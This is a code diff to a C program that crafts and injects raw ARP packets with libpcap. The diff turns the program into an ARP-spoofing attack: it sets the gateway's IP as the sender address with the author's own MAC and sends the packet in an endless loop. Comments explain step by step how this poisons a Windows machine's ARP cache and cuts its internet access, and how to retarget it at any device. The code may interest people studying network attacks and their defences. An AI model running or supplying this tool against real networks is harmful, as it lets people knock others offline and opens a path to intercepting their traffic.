@@ -3,7 +3,6 @@
 #include<netinet/in.h>
 #include<netinet/if_ether.h>
 #include<stdio.h>
-#include<sys/socket.h>	//socket()
 #include<arpa/inet.h>	//IPPROTO_RAW
 #include<string.h>	//memset
 #include<net/if.h>	//if_req
@@ -18,10 +17,20 @@
 #include<sys/wait.h>
 #include<unistd.h>
 
-char* src_mac_str = "08:00:27:21:58:3E";
-char* dest_mac_str = "FF:FF:FF:FF:FF:FF";
-char* src_ip_str = "192.168.173.230";
-char* dest_ip_str = "192.168.173.215";
+
+//connected to my mobile hotspot(router), so the IPs change when we switch to other network
+char* src_mac_str = "08:00:27:21:58:3E"; //MY UBUNTU MAC
+char* dest_mac_str = "FF:FF:FF:FF:FF:FF";//BROADCAST
+char* src_ip_str = "192.168.173.183";//GATEWAY'S IP (SPOOFING AS MINE - MY IP : 192.169.173.230)
+char* dest_ip_str = "192.168.173.70";//"192.168.173.70";//WINDOWS' IP
+
+//1. ARP PACKET FIRST GOES TO ROUTER 
+//2. ROUTER CHECKS THAT ITS IP IS NOT THE SAME AS DESTINATION IP IN THE PACKET
+//3. ROUTER BROADCASTS THE PACKET
+//4. WINDOWS REPLYS BECAUSE IT IS THE DESTINATION
+//5. WINDOWS ALSO OBSERVES THE SOURCE IP - MAC MAPPING IN THE ARP PACKET AND LEARNS IT AND UPDATES IT ARP CACHE WITH MAPPING AS 192.168.173.183 -> 08:00:27:21:58:3E WHICH IS NOT A CRCT MAPPING
+//6. THIS LEADS TO DISRUPTION OF INTERNET ON MY WINDOWS
+//7. TO STOP INTERNET ON ANY OTHER DEVICE CHANGE THE dest_ip_str TO THE DEVICE'S IP WHILE STILL SETTING THE src_ip_str AS GATEWAY'S IP ONLY.
 
 void printEthHdr(char* packet){
 	struct ethhdr* eth = (struct ethhdr*)packet;
@@ -41,7 +50,7 @@ void printArpHdr(struct ether_arp* arpHdr){
     printf("\t|-Protocol Len : %d\n",arpHdr->arp_pln);
     printf("\t|-OpCode : %d\n",ntohs(arpHdr->arp_op));
     printf("\t|-Source MAC : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",arpHdr->arp_sha[0],arpHdr->arp_sha[1],arpHdr->arp_sha[2],arpHdr->arp_sha[3],arpHdr->arp_sha[4],arpHdr->arp_sha[5]);
-    if(arpHdr->arp_op == 2)
+    if(ntohs(arpHdr->arp_op) == 2)
     printf("\t|-Destination MAC : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",arpHdr->arp_tha[0],arpHdr->arp_tha[1],arpHdr->arp_tha[2],arpHdr->arp_tha[3],arpHdr->arp_tha[4],arpHdr->arp_tha[5]);
     printf("\t|-Sender IP: %u.%u.%u.%u\n",arpHdr->arp_spa[0], arpHdr->arp_spa[1], arpHdr->arp_spa[2], arpHdr->arp_spa[3]);
     printf("\t|-Target IP: %u.%u.%u.%u\n", arpHdr->arp_tpa[0], arpHdr->arp_tpa[1], arpHdr->arp_tpa[2], arpHdr->arp_tpa[3]);
@@ -87,6 +96,11 @@ void fillArpHdr(char* packet,int opCode){
 
     	if(opCode == 1)
     		memset(&arp->arp_tha, 0, sizeof(struct ether_addr));
+    	else if (ether_aton_r(dest_mac_str, (struct ether_addr*)&arp->arp_tha) == NULL) {
+        	printf("Error converting target MAC address\n");
+        	return;
+    	}
+    		
 
     	// Convert destination IP address string to binary
     	if (inet_pton(AF_INET, dest_ip_str, &arp->arp_tpa) != 1) {
@@ -120,9 +134,11 @@ void injector(int arp_flag){
      		char frame[sizeof(struct ether_header)+sizeof(struct ether_arp)];
      		fillEtherHdr(frame);
      		fillArpHdr(frame + sizeof( struct ether_header),1);
-     		if (pcap_inject(handle,frame,sizeof(struct ether_header)+sizeof(struct ether_arp)) == -1) {
-        		pcap_perror(handle,0);
-        		pcap_close(handle);
+     		while(1){
+	     		if (pcap_inject(handle,frame,sizeof(struct ether_header)+sizeof(struct ether_arp)) == -1) {
+				pcap_perror(handle,0);
+				pcap_close(handle);
+	    		}
     		}
      	}
 }
